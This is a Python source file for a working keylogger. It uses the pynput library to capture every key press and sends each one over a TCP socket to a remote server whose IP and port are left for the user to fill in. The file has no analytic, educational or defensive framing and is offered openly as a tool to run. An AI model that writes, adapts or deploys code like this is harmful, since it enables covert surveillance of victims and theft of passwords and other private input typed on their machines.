from pynput import keyboard
import socket

SERVER_IP = '0.0.0.0' # Replace with your server's IP address
SERVER_PORT = 1234    # Replace with your server's port

try:
    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target_socket.connect((SERVER_IP, SERVER_PORT))
    
except Exception as e:
    target_socket = None  
    with open("debug_log.txt", 'a') as debug_file:
        debug_file.write(f"Connection error: {e}\n")


def on_key_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_data = f"{key.char}\n"
        else:
            key_data = f"[{key}]\n"
 
        if target_socket:
            target_socket.send(key_data.encode('utf-8'))
    except Exception as e:
        with open("debug_log.txt", 'a') as debug_file:
            debug_file.write(f"Error logging key press: {e}\n")

with keyboard.Listener(on_press=on_key_press) as listener: 
    listener.join() 

if target_socket:
    try:
        target_socket.send(b"[Keylogger Closed]\n")  
        target_socket.close()  
    except Exception as e:
        with open("debug_log.txt", 'a') as debug_file:
            debug_file.write(f"Error closing socket: {e}\n")
    